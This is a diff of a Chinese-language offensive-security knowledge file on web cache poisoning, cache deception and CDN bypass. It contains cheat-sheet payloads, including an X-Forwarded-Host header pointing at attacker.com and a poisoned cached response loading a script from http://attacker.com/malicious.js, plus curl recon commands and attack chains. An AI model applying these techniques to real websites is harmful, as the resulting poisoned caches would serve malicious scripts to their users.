@@ -1,72 +1,114 @@
 name: 缓存投毒攻击
-description: Web缓存投毒和CDN利用技术
+description: Web缓存投毒和CDN绕过技术
 domain: web
-version: '1.0'
+version: '3.0'
 tags:
 - web
 - cache
 - cdn
-knowledge: '# 缓存与CDN安全
+- cache-poisoning
 
+knowledge: |
+  # 缓存投毒攻击
 
-  ## 1. 缓存投毒
-
-
-  ### HTTP头投毒
-
-
+  ## 攻击思路
+  ```
+  识别缓存机制 → 找到unkeyed输入 → 注入恶意响应 → 缓存存储 → 用户获取恶意内容
   ```
 
-  X-Forwarded-Host: attacker.com
+  ## 缓存机制识别
 
+  | 特征 | 检测方法 |
+  |------|----------|
+  | CDN | X-Cache/X-Cache-Status响应头 |
+  | 响应缓存 | 不同URL返回相同缓存 |
+  | 缓存键 | 识别哪些请求头参与缓存计算 |
+
+  ```bash
+  # 检测缓存
+  curl -I http://target | grep -i "x-cache"
+
+  # 测试缓存键
+  curl http://target # 响应1
+  curl http://target -H "X-Test: 1" # 若响应相同则X-Test不是缓存键
   ```
 
+  ## 缓存投毒攻击矩阵
 
-  ### 缓存污染
+  | 攻击类型 | Unkeyed输入 | Payload |
+  |----------|-------------|---------|
+  | Host头投毒 | X-Forwarded-Host | X-Forwarded-Host: attacker.com |
+  | 路径投毒 | 被忽略的路径参数 | /page?x=../attacker.com |
+  | Header投毒 | 不参与缓存计算的头 | User-Agent/Referer等 |
+  | Cookie投毒 | 不缓存Cookie的响应 | Cookie注入恶意值 |
 
-
+  ### Host头投毒
   ```
-
+  请求:
   GET / HTTP/1.1
-
-  Host: example.com
-
+  Host: target.com
   X-Forwarded-Host: attacker.com
 
+  响应(被缓存):
+  <script src="http://attacker.com/malicious.js"></script>
+
+  后续用户请求此URL都会获取恶意脚本
   ```
 
+  ## 缓存欺骗攻击
 
-  ## 2. 缓存欺骗
+  | 攻击方式 | Payload | 原理 |
+  |----------|---------|------|
+  | Web缓存欺骗 | /static/..;/private.js | 路径混淆让缓存存储私密数据 |
+  | 图片缓存欺骗 | /profile.jpg/../private-data | 缓存认为是静态资源 |
 
-
-  ### Web缓存欺骗
-
-
+  ```bash
+  # 缓存欺骗示例
+  http://target.com/css/..;/main.js → 缓存存储main.js
+  http://target.com/profile.jpg/../api/private-data → 缓存存储私密数据
   ```
 
-  http://target.com/css/..;/main.js
+  ## CDN绕过技术
 
-  ```
+  | 技术 | 方法 | 目标 |
+  |------|------|------|
+  | 源站IP发现 | DNS历史/证书搜索 | 直接攻击源站 |
+  | 回源请求 | 特定Header触发回源 | 绕过CDN缓存 |
+  | 子域名枚举 | 找未走CDN的子域名 | 绕过CDN防护 |
 
-
-  ## 3. CDN绕过
-
-
-  ### 源站IP发现
-
-
-  ```
-
-  nslookup target.com
-
+  ```bash
+  # 源站IP发现
   dig target.com
+  curl https://crt.sh/?q=target.com
 
+  # 回源请求
+  curl -H "X-Origin: bypass" http://target.com
+
+  # 子域名枚举
+  subfinder -d target.com
   ```
 
+  ## 高级投毒链
 
-  ### 配置错误
+  ```
+  1. 识别缓存系统(CDN类型)
+  2. 找到unkeyed输入(不参与缓存计算)
+  3. 构造包含恶意内容的响应
+  4. 请求被缓存系统存储
+  5. 等待用户请求相同URL获取恶意内容
+  ```
 
+  ### 组合攻击
+  ```
+  缓存投毒 + XSS → 存储型XSS
+  缓存投毒 + SSRF → 内网访问
+  缓存投毒 + 重定向 → 钓鱼攻击
+  ```
 
-  ### 回源请求利用
+  ## 缓存清理绕过
 
-  '
+  | 方法 | 技术 |
+  |------|------|
+  | 覆盖投毒 | 新请求覆盖旧缓存 |
+  | 等待过期 | 缓存自然过期 |
+  | 强制刷新 | 特定参数触发刷新 |
